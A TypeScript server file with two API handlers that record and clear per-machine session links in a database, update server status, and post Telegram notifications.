import type { Env, SessionReportRequest } from '../types';
import { enableFK, jsonOk, jsonError, validateMachineId } from '../db';
import { sendTelegram } from '../telegram/notify';

// POST /sessions
export async function handleSessionCreate(request: Request, env: Env): Promise<Response> {
  let body: SessionReportRequest;
  try {
    body = await request.json() as SessionReportRequest;
  } catch {
    return jsonError('Invalid JSON', 400);
  }

  const { machine_id, link, action_id } = body;
  if (!validateMachineId(machine_id)) return jsonError('Invalid machine_id', 400);
  if (typeof link !== 'string' || !link) return jsonError('Invalid link', 400);
  if (typeof action_id !== 'string' || !action_id) return jsonError('Invalid action_id', 400);

  const db = env.DB;
  await enableFK(db);

  // Guard: server must have beaconed first
  const server = await db
    .prepare('SELECT hostname FROM servers WHERE machine_id = ?')
    .bind(machine_id)
    .first<{ hostname: string }>();

  if (!server) return jsonError('Not found', 404);

  const now = Date.now();

  // Upsert session
  await db
    .prepare(
      `INSERT INTO sessions (machine_id, link, created_at) VALUES (?, ?, ?)
       ON CONFLICT(machine_id) DO UPDATE SET link = excluded.link, created_at = excluded.created_at`
    )
    .bind(machine_id, link, now)
    .run();

  // Mark action done
  await db
    .prepare(`UPDATE actions SET status = 'done' WHERE id = ? AND machine_id = ?`)
    .bind(action_id, machine_id)
    .run();

  // Update server status
  await db
    .prepare(`UPDATE servers SET status = 'active', last_seen = ? WHERE machine_id = ?`)
    .bind(now, machine_id)
    .run();

  sendTelegram(env, `✅ <b>${server.hostname}</b> ready\n<code>${link}</code>`);

  return jsonOk({ ok: true });
}

// POST /sessions/:machine_id/clear
export async function handleSessionClear(
  _request: Request,
  env: Env,
  machine_id: string
): Promise<Response> {
  if (!validateMachineId(machine_id)) return jsonError('Invalid machine_id', 400);

  const db = env.DB;
  await enableFK(db);

  const server = await db
    .prepare('SELECT hostname FROM servers WHERE machine_id = ?')
    .bind(machine_id)
    .first<{ hostname: string }>();

  if (!server) return jsonError('Not found', 404);

  await db
    .prepare('DELETE FROM sessions WHERE machine_id = ?')
    .bind(machine_id)
    .run();

  await db
    .prepare(`UPDATE servers SET status = 'idle', last_seen = ? WHERE machine_id = ?`)
    .bind(Date.now(), machine_id)
    .run();

  sendTelegram(env, `🔴 <b>${server.hostname}</b> session closed`);

  return jsonOk({ ok: true });
}
